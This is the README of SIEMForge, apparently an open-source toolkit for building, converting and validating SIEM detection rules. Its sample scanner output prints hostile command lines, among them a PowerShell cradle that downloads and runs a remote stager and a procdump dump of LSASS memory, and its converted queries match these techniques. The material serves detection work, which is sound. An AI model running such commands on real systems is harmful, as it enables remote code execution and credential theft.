# SIEMForge -- SIEM Detection Content Toolkit

**Author:** Jude Hilgendorf | [github.com/TiltedLunar123](https://github.com/TiltedLunar123)

[![CI](https://github.com/TiltedLunar123/SIEMForge/actions/workflows/ci.yml/badge.svg?branch=master)](https://github.com/TiltedLunar123/SIEMForge/actions/workflows/ci.yml)
![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)
![Sigma Rules](https://img.shields.io/badge/detection-Sigma%20Rules-brightgreen)
![Wazuh Custom Rules](https://img.shields.io/badge/detection-Wazuh%20Custom%20Rules-orange)
![Sysmon Config](https://img.shields.io/badge/config-Sysmon-blueviolet)
![MITRE ATT&CK Mapped](https://img.shields.io/badge/framework-MITRE%20ATT%26CK%20Mapped-red)
![License MIT](https://img.shields.io/badge/license-MIT-green)

> An all-in-one toolkit for building, converting, validating, and deploying SIEM detection content -- Sigma rules, Sysmon configuration, Wazuh custom rules, MITRE ATT&CK mapping, log scanning, exporting, converting, and validation.

---

## What's New in v3.1

- **Expanded test suite** -- 138 tests covering CLI, scanner edge cases, stats output, and new sample data.
- **Better error handling** -- converter and scanner errors are caught and reported gracefully with proper exit codes.
- **More sample data** -- process injection, service installation, user creation, CSV, and a clean baseline for false positive validation.
- **CI improvements** -- Windows matrix testing, all three converter backends smoke-tested, MITRE and export smoke tests.
- **Sigma spec fix** -- `ssh_bruteforce_burst.yml` now uses proper field-condition mapping.

---

## Quick Start

```bash
git clone https://github.com/TiltedLunar123/SIEMForge.git
cd SIEMForge
pip install pyyaml
```

### Examples

Scan a log file against all bundled Sigma rules:

```bash
python -m siemforge --scan /var/log/sysmon/events.json
```

Convert a Sigma rule to Splunk SPL:

```bash
python -m siemforge --convert splunk rules/sigma/proc_creation_suspicious_powershell.yml
```

Validate every rule in the rules directory:

```bash
python -m siemforge --validate rules/sigma/
```

Print the MITRE ATT&CK coverage matrix for all rules:

```bash
python -m siemforge --mitre rules/sigma/
```

---

## Log Scanner

The log scanner lets you test Sigma detection logic against raw log files without deploying to a SIEM. It supports the following formats:

| Format | Extension / Flag     | Notes                                      |
|--------|----------------------|--------------------------------------------|
| JSON   | `.json`              | Single object or top-level array            |
| JSONL  | `.jsonl`             | One JSON object per line                    |
| Syslog | `.log`, `.syslog`    | RFC 3164 / RFC 5424 parsed into key-value   |
| CSV    | `.csv`               | Header row required; fields map to columns  |

### Scanner Examples

Scan a JSONL export from Sysmon:

```bash
python -m siemforge --scan /var/log/sysmon/events.jsonl
```

Scan a CSV with an explicit format flag:

```bash
python -m siemforge --scan firewall_logs.csv --scan-format csv
```

Output results as machine-readable JSON:

```bash
python -m siemforge --scan events.json --json
```

### Example Output

```
$ python -m siemforge --scan /var/log/sysmon/events.json

[*] SIEMForge Log Scanner v3.0.0
[*] Loading rules from rules/sigma/ ...
[*] Loaded 10 Sigma rules
[*] Scanning /var/log/sysmon/events.json (json, 4823 events)

[ALERT] Rule: Suspicious PowerShell Download Cradle
        Technique: T1059.001
        Event #312 | 2026-03-14T08:41:02Z
        CommandLine: powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/stager.ps1')"

[ALERT] Rule: LSASS Memory Dump via Procdump
        Technique: T1003.001
        Event #1087 | 2026-03-14T09:17:45Z
        CommandLine: procdump -ma lsass.exe lsass.dmp

[*] Scan complete: 2 alerts across 4823 events
```

---

## Detection Coverage

| # | Rule File                                        | Technique   | Tactic               |
|---|--------------------------------------------------|-------------|-----------------------|
| 1 | `proc_creation_suspicious_powershell.yml`        | T1059.001   | Execution             |
| 2 | `proc_creation_lsass_dump.yml`                   | T1003.001   | Credential Access     |
| 3 | `proc_creation_certutil_download.yml`            | T1105       | Command and Control   |
| 4 | `proc_creation_mshta_execution.yml`              | T1218.005   | Defense Evasion       |
| 5 | `proc_creation_rundll32_unusual.yml`             | T1218.011   | Defense Evasion       |
| 6 | `registry_persistence_run_key.yml`               | T1547.001   | Persistence           |
| 7 | `file_creation_webshell_drop.yml`                | T1505.003   | Persistence           |
| 8 | `network_connection_c2_beacon.yml`               | T1071.001   | Command and Control   |
| 9 | `process_injection_createremotethread.yml`       | T1055.001   | Defense Evasion       |
|10 | `scheduled_task_creation.yml`                    | T1053.005   | Execution             |

---

## Project Structure

```
SIEMForge/
├── siemforge/                  # Main Python package
│   ├── __init__.py
│   ├── __main__.py             # CLI entry point
│   ├── scanner.py              # Log scanner engine
│   ├── converter.py            # Sigma rule converter
│   ├── validator.py            # Rule validation logic
│   ├── mitre.py                # ATT&CK mapping utilities
│   └── converters/             # Backend-specific converters
│       ├── splunk.py
│       ├── elastic.py
│       └── kibana.py
├── rules/
│   └── sigma/                  # Sigma detection rules (YAML)
├── configs/
│   ├── sysmon_config.xml       # Sysmon configuration
│   └── wazuh_rules.xml         # Wazuh custom rules
├── samples/
│   ├── events.json             # Sample JSON log file
│   ├── events.jsonl            # Sample JSONL log file
│   └── firewall.csv            # Sample CSV log file
├── tests/
│   ├── test_scanner.py
│   ├── test_converter.py
│   └── test_validator.py
├── requirements.txt
├── LICENSE
└── README.md
```

---

## Sigma Conversion

SIEMForge converts Sigma rules into native query syntax for multiple backends.

### Splunk (SPL)

```bash
python -m siemforge --convert splunk rules/sigma/proc_creation_suspicious_powershell.yml
```

Output:

```
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
    EventCode=1
    CommandLine="*powershell*" AND (CommandLine="*-ep bypass*" OR CommandLine="*DownloadString*")
```

### Elasticsearch (Lucene)

```bash
python -m siemforge --convert elastic rules/sigma/proc_creation_lsass_dump.yml
```

Output:

```
event.code:1 AND process.command_line:(*procdump* AND *lsass*)
```

### Kibana (KQL)

```bash
python -m siemforge --convert kibana rules/sigma/registry_persistence_run_key.yml
```

Output:

```
event.code: 13 and registry.path: *\\CurrentVersion\\Run*
```

---

## CLI Options

| Flag              | Description                                              |
|-------------------|----------------------------------------------------------|
| `--scan FILE`     | Scan a log file against all loaded Sigma rules           |
| `--scan-format FMT` | Force log format: `json`, `jsonl`, `syslog`, `csv`    |
| `--json`          | Output scan results as JSON instead of human-readable    |
| `--convert BACKEND RULE` | Convert a Sigma rule to the given backend (`splunk`, `elastic`, `kibana`) |
| `--validate PATH` | Validate one rule or a directory of rules                |
| `--mitre PATH`    | Print the MITRE ATT&CK technique coverage matrix         |
| `--rules-dir DIR` | Use a custom rules directory (default: `rules/sigma/`)   |
| `--config FILE`   | Specify a custom Sysmon config for reference             |
| `--output FILE`   | Write results to a file instead of stdout                |
| `--verbose`       | Enable verbose / debug output                            |
| `--version`       | Print SIEMForge version and exit                         |

---

## Deployment Guide

### Sysmon

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Install with the provided configuration:

```powershell
sysmon64.exe -accepteula -i configs\sysmon_config.xml
```

3. To update an existing installation:

```powershell
sysmon64.exe -c configs\sysmon_config.xml
```

4. Verify Sysmon is running:

```powershell
Get-Service Sysmon64
```

### Wazuh

1. Copy the custom rules into the Wazuh manager rules directory:

```bash
cp configs/wazuh_rules.xml /var/ossec/etc/rules/local_rules.xml
```

2. Restart the Wazuh manager to load the new rules:

```bash
systemctl restart wazuh-manager
```

3. Confirm the rules loaded without errors:

```bash
/var/ossec/bin/wazuh-logtest
```

---

## Home Lab Setup

The following diagram illustrates a typical home lab deployment using SIEMForge rules across Sysmon and Wazuh.

```
+----------------------------------------------------------+
|                      HOME LAB NETWORK                     |
|                       192.168.1.0/24                      |
+----------------------------------------------------------+
|                                                          |
|   +-----------------+       +-----------------------+    |
|   |  Windows Host   |       |    Wazuh Manager      |    |
|   |  (Sysmon agent) | ----> |  /var/ossec/          |    |
|   |  192.168.1.10   |       |  192.168.1.50         |    |
|   +-----------------+       +-----------+-----------+    |
|                                         |                |
|   +-----------------+                   v                |
|   |  Linux Host     |       +-----------------------+    |
|   |  (Wazuh agent)  | ----> |   Wazuh Dashboard     |    |
|   |  192.168.1.20   |       |   https://:443        |    |
|   +-----------------+       +-----------------------+    |
|                                         |                |
|   +-----------------+                   v                |
|   |  Attacker VM    |       +-----------------------+    |
|   |  (Kali Linux)   |       |   Analyst Workstation |    |
|   |  192.168.1.99   |       |   SIEMForge CLI       |    |
|   +-----------------+       |   192.168.1.5         |    |
|                             +-----------------------+    |
+----------------------------------------------------------+
```

---

## Development

Contributions are welcome. Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on adding rules, writing converter backends, extending the scanner, and running the test suite.

```bash
# Install dev dependencies
pip install -r requirements-dev.txt

# Run all tests
pytest tests/ -v

# Run tests with coverage
pytest tests/ -v --cov=siemforge --cov=converters --cov-report=term-missing

# Lint
ruff check .
```

---

## Disclaimer

SIEMForge is provided for **authorized security testing and educational purposes only**. Do not use these detection rules, configurations, or tools against systems you do not own or have explicit written permission to test. The author assumes no liability for misuse.

---

## License

This project is licensed under the [MIT License](LICENSE).

```
MIT License

Copyright (c) 2026 Jude Hilgendorf

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
